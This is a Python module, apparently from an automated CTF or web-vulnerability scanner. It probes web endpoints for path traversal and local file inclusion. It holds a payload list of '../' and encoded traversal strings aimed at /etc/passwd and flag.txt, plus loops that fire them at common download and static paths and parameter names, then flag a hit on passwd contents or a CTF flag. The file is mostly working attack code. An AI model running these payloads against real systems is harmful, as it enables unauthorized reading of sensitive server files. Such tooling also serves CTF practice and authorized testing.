"""路径遍历 / 任意文件读取（LFI）检查：../ 探测 + 编码绕过。"""
from __future__ import annotations

from ..common import Candidate, body_of, extract_flag, get

FILE_PARAM_NAMES = ["file", "path", "filename", "f", "name", "download", "dir",
                    "img", "image", "page", "template", "load", "view", "resource"]

TRAVERSALS = [
    "../../../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "../../../../etc/passwd",
    "../../../flag.txt",
    "../../flag.txt",
    "../flag.txt",
    "../../../../../../../../flag.txt",
    "....//....//flag.txt",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
]

# 命中判定：读到 passwd 特征
PASSWD_MARKER = "root:x:0:0:"


def run(ctx) -> list[Candidate]:
    out: list[Candidate] = []
    base = ctx["base"].rstrip("/")

    # 路径型：/download?file=... 与路径分段型 /files/../../etc/passwd
    for path in ("/download", "/file", "/files", "/read", "/get", "/view",
                 "/static", "/images", "/img"):
        if ctx["time_left"]() <= 0:
            break
        for pname in FILE_PARAM_NAMES:
            if ctx["time_left"]() <= 0:
                break
            for trav in TRAVERSALS:
                if ctx["time_left"]() <= 0:
                    break
                r = get(base + path, ctx["timeout"], params={pname: trav})
                if r is None:
                    continue
                body = body_of(r)
                flag = extract_flag(body)
                if flag:
                    out.append(Candidate(
                        type="lfi", url=f"{base}{path}?{pname}={trav}",
                        request=f"GET {path}?{pname}=<traversal>",
                        response=body[:300],
                        impact=f"路径遍历 {pname} 参数读取 flag",
                        confidence=0.95, value=flag,
                        confirm={"note": "遍历载荷命中 flag"},
                    ))
                    return out
                if PASSWD_MARKER in body:
                    out.append(Candidate(
                        type="lfi", url=f"{base}{path}?{pname}={trav}",
                        request=f"GET {path}?{pname}=<traversal>",
                        response=body[:300],
                        impact=f"路径遍历 {pname} 参数可读 /etc/passwd",
                        confidence=0.9,
                        confirm={"note": "读到 passwd 文件特征"},
                    ))
                    return out

    # 路径分段型：/static/../../etc/passwd
    for base_path in ("/static", "/assets", "/public", "/files", "/uploads"):
        if ctx["time_left"]() <= 0:
            break
        for trav in ("../../../../../../etc/passwd", "../../../flag.txt"):
            r = get(base + base_path + "/" + trav, ctx["timeout"])
            if r is None:
                continue
            body = body_of(r)
            flag = extract_flag(body)
            if flag or PASSWD_MARKER in body:
                out.append(Candidate(
                    type="lfi", url=base + base_path + "/" + trav,
                    request=f"GET {base_path}/<traversal>",
                    response=body[:300],
                    impact="路径遍历读文件" + ("（flag）" if flag else "（passwd）"),
                    confidence=0.95 if flag else 0.9,
                    value=flag,
                    confirm={"note": "路径分段遍历命中"},
                ))
                return out
    return out
